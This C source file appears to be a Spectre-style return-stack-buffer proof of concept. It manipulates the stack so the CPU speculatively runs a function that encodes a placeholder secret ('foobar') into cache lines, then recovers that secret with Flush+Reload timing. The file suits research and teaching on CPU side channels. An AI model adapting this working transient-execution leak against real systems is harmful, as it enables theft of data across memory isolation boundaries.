#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include "../sidechannel/flush_reload.h"


#define CACHE_MISS 80
char* channel;
int pagesize = 4096;

// 698: call_start
// 688: call_leak
// 678: call_manipulate

inline void __attribute__((__always_inline__)) maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }


// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  register uintptr_t sp asm ("sp");
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  _mm_clflush(sp);
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
#endif
  return 0;
}

int __attribute__ ((noinline)) call_leak(char s) {
  // Manipulate the stack so that we don't return here, but to call_start
  //maccess(&secret);
  //maccess(probe_buf);
  //maccess(&pagesize);
  //_mm_clflush(&call_manipulate_stack);
  //_mm_lfence();
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  
  //encode(channel,s, pagesize);
  maccess(channel + s * pagesize);
  _mm_mfence();
  return 2;
}

int __attribute__ ((noinline)) call_start(char s) {
  call_leak(s);
  _mm_mfence();
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  char s = 'A';

  call_start(s);
  call_leak(s);
  call_manipulate_stack();

}

int main(int argc, const char **argv) {
  // Detect cache threshold
  char* secret = "foobar";
  size_t secret_size = 6;
  int mix_i;
  int i, j;
  char* addr;
  char cc;

  channel = malloc(256 * pagesize);
  memset(channel, 1, 256*pagesize);
  flush(channel, pagesize);

  _mm_mfence();
  for (int p =0; p < 8; p++) { // ! introducing for loop changes where a hit is measured
    _mm_mfence();
    // for every byte in the string
    

    cc = secret[p % secret_size];
    _mm_mfence();
    call_start(cc);
    //call_start('D');
    _mm_mfence();

    // Recover data from covert channel
    
    //printf("hit at %d\n",probe(channel,CACHE_MISS, pagesize));
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      if (32 > mix_i || mix_i > 126){
          continue;
      }
      addr = channel + mix_i * pagesize;
      if (flush_reload_t(addr) <= CACHE_MISS){
          printf("%c\n", mix_i);
          //results[mix_i]++;
      }
      _mm_mfence();
    }

    _mm_mfence();
  }
  free(channel);

  return (0);
}
